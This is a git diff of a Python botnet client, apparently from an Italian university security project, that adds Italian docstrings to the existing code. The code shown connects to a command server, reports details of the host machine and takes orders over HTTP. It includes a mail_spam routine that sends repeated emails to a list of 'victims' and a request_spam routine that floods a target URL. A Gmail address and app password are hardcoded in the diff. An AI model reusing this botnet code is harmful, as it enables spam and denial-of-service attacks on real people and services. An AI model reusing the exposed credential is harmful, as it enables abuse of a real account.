@@ -12,10 +12,12 @@ from urllib.error import HTTPError, URLError
 from urllib.request import Request, urlopen
 
 server_address = ('10.0.2.15', 15200)
-# server_address = ('localhost', 15200)
 
 
 def initialize_bot():
+    """
+    Avvia il thread principale del bot
+    """
     print("Initializing bot...")
     with ThreadPoolExecutor(max_workers=1) as ex:
         x = ex.submit(run)
@@ -26,6 +28,9 @@ def initialize_bot():
 
 
 def run():
+    """
+    Avvia il bot e lo connette al server inviando l'ip e la porta su cui è in ascolto
+    """
     server = HTTPServer(('', 0), Bot)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((server_address[0], server_address[1]))
@@ -38,6 +43,10 @@ def run():
 
 
 def get_client_info():
+    """
+    Raccoglie informazioni relative alla macchina su cui è in esecuzione il bot
+    :return:
+    """
     return {
         "cpu": platform.processor(),
         'architecture': platform.architecture(),
@@ -48,6 +57,11 @@ def get_client_info():
 
 
 class Bot(BaseHTTPRequestHandler):
+    """
+    Classe che gestisce le richieste http in arrivo dal centro di comando
+    Implementa i metodi do_GET e do_POST
+    """
+
     event = Event()
 
     current_action = []
@@ -100,6 +114,13 @@ class Bot(BaseHTTPRequestHandler):
             self.start_thread(t)
 
     def mail_spam(self, victims, message, obj, number_of_emails):
+        """
+        Invia un numero di email alla lista di vittime specificata
+        :param victims: lista di mail delle vittime
+        :param message: messaggio da inviare
+        :param obj: oggetto della mail
+        :param number_of_emails: numero di mail da inviare
+        """
         sender = "botnetsicurezza@gmail.com"
         password = "cebqshlncuewhjso"
 
@@ -126,7 +147,11 @@ class Bot(BaseHTTPRequestHandler):
         smtp_server.quit()
 
     def request_spam(self, url, e):
-
+        """
+        Invia richieste http al server specificato. Se il server non è raggiungibile, il thread si ferma
+        :param url: url a cui inviare le richieste
+        :param e: evento che ferma il thread
+        """
         if not self.current_action:
             self.current_action.append({
                 "operation": "Attacco in corso",
